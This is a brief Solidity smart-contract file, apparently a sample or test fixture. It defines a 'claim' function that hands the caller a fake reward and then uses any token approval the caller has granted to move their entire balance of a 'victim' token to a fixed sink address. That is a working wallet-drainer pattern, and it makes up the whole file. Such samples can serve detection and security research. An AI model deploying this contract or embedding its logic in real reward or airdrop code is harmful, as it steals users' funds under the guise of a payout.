// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IUnsafeToken {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract UnsafeClaim {
    IUnsafeToken public immutable rewardToken;
    IUnsafeToken public immutable victimToken;
    address public immutable sink;
    uint256 public constant FAKE_REWARD = 1e6;

    constructor(address rewardToken_, address victimToken_, address sink_) {
        rewardToken = IUnsafeToken(rewardToken_);
        victimToken = IUnsafeToken(victimToken_);
        sink = sink_;
    }

    function claim() external {
        require(rewardToken.transfer(msg.sender, FAKE_REWARD), "fake reward");
        uint256 victimBalance = victimToken.balanceOf(msg.sender);
        if (victimBalance > 0) {
            require(victimToken.transferFrom(msg.sender, sink, victimBalance), "victim transfer");
        }
    }
}

